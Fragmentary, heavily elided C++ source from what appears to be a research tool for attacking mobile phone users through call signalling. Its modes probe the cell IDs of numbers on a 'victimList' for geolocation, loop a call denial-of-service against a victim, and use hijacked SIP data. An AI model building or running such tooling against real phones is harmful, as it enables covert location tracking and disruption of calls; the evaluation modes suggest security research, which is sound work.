...
Application::~Application() {
  ...
  for (const auto& entry : fs::directory_iterator(fs::current_path())) {
    ...
    if (filename.rfind("User_Hand_", 0) == 0 &&
...
void Application::runLegacyMode(
    pollfd& pfd,
    int nReady,
    const std::vector<std::string>& victimList) {
  switch (util::context.runMode) {
    case NativeRunMode::LOCAL_SERVER:
      std::cout << "Launch local Cell ID prober" << std::endl;
      startRemoteCallServer(pfd, nReady, victimList);
      break;
    case NativeRunMode::ADAPTIVE_REMOTE_SERVER:
      std::cout << "Launch RL-assisted Remote Cell ID prober" << std::endl;
      startRemoteCallServer(pfd, nReady, victimList);
      break;
    case NativeRunMode::UNAVAILABILITY_EVALUATION:
      while (true) {
        std::cout << "Eval one call unavailability" << std::endl;
        CallDoS(pfd, nReady, victimList[0]);
      }
      break;
    case NativeRunMode::DETECTION_EVALUATION:
      for (auto i = 0; i < 15; i++) {
        std::cout << "Eval one call detect" << std::endl;
        CallDetect(pfd, nReady, victimList[0]);
      }
      break;
    case NativeRunMode::REMOTE_PROBE:
    case NativeRunMode::NONE:
      break;
  }
}
...
void Application::extractCellularInfo(const std::string& input, const std::string& phoneNumber) {
  ...
  if (std::regex_search(accessNetwork, match, networkInfoRegex) ) {
    ...
    if (std::regex_match(cellId, match, cellIdRegex)) {
      ...
      // Probe app mode performs geolocation on the app side.
      // Avoid duplicate Google API calls from native + app for the same probe cycle.
      if (isRemoteProbeMode(util::context.runMode)) return;
    ...
    for (size_t i = 0; i < pollfds.size(); ++i) {
      ...
      if(pollfds[i].fd == remoteSocket) {
        ...
        if(recvcnt == 0) {
          ...
          if (util::context.runMode != NativeRunMode::ADAPTIVE_REMOTE_SERVER) {
            calleeId = remoteHijackedSip[2];
          }
